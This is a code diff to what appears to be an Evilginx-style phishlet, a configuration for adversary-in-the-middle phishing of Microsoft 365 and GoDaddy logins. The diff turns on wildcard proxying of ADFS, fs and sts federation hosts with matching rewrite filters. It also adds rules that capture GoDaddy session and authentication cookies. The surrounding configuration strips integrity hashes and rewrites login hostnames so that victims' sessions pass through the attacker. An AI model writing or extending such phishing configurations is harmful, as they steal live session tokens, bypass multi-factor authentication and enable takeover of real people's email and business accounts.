@@ -23,10 +23,10 @@ proxy_hosts:
   - {phish_sub: 'aadcdnimg', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'lgincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
 
-  # ADFS / generic federation (wildcard) — disabled: domain: '*' is unsupported, exact string match only
-  #- {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
-  #- {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
-  #- {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
+  # ADFS / generic federation (wildcard) — supported by wildcard proxy host matching
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '*', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   # Strip SRI integrity hashes — auto_filter modifies CDN JS content, breaking the hash
@@ -70,10 +70,10 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
 
-  # ADFS / fs / sts federation passthroughs — disabled: triggers_on wildcard never matches
-  #- {triggers_on: 'adfs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  #- {triggers_on: 'fs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  #- {triggers_on: 'sts.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # ADFS / fs / sts federation passthroughs — wildcard triggers_on keys are supported
+  - {triggers_on: 'adfs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'fs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sts.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   # Microsoft primary auth cookies
@@ -100,6 +100,19 @@ auth_tokens:
 
   - domain: '.outlook.office365.com'
     keys: ['OutlookSession,opt', 'UC,opt', 'X-OWA-CANARY,opt', 'ClientId,opt', 'RPSAuth,opt', 'RPSSecAuth,opt']
+    type: 'cookie'
+
+  # GoDaddy auth cookies (added to support GoDaddy email/login flows)
+  - domain: '.godaddy.com'
+    keys: ['GPS,opt', 'GLPVC,opt', 'MUID,opt', 'BJSID,opt', 'clientState,opt', 'sessionUser,opt', 'SWLiveAuth,opt']
+    type: 'cookie'
+
+  - domain: '.sso.godaddy.com'
+    keys: ['GPS,opt', 'GLPVC,opt', 'SWLiveAuth,opt', 'clientState,opt']
+    type: 'cookie'
+
+  - domain: '.api.godaddy.com'
+    keys: ['GPS,opt', 'GLPVC,opt', 'SWLiveAuth,opt', 'clientState,opt']
     type: 'cookie'
 
   # Live.com consumer auth
